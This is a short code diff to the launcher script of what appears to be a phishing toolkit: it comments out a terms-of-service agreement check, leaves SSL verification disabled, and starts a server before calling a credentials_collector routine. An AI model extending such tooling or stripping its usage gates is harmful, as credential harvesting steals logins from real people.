@@ -4,6 +4,7 @@
 #    This is free software, and you are welcome to redistribute it
 #    under certain conditions; you can read LICENSE for details.
 #
+
 import multiprocessing
 import ssl
 from os import environ
@@ -12,10 +13,15 @@ import Defs.ActionManager.Server.server_runner as server_runner
 import Defs.ActionManager.simple_informant as simple_informant
 import Defs.FeatureManager.feature_prompt as prompt
 
-simple_informant.license_handler()
-agreement = simple_informant.terms_of_service_message()
-if not agreement:
-    exit()
+# simple_informant.license_handler()
+# agreement = simple_informant.terms_of_service_message()
+# if not agreement:
+#     exit()
+# TODO replace everything above
+
+
+# FIXME new code above
+
 
 if not environ.get("PYTHONHTTPSVERIFY", "") and getattr(
         ssl, "_create_unverified_context", None):
@@ -42,11 +48,11 @@ if __name__ == "__main__":
         server_runner.server_selection(port)
 
         multiprocessing.Process(target=server_runner.start_server,
-                                args=(port, )).start()
+                                args=(port,)).start()
         simple_informant.credentials_collector()
 
     except KeyboardInterrupt:
-        # When Keyword Interrupt Occurs before defining Port by User. Script will use 8080 port.(Just To Remove Exception Errors)
+        # When Keyword Interrupt Occurs script will use 8080 port.(Just To Remove Exception Errors)
         port = "8080"
         simple_informant.exit_message(port)
         exit()
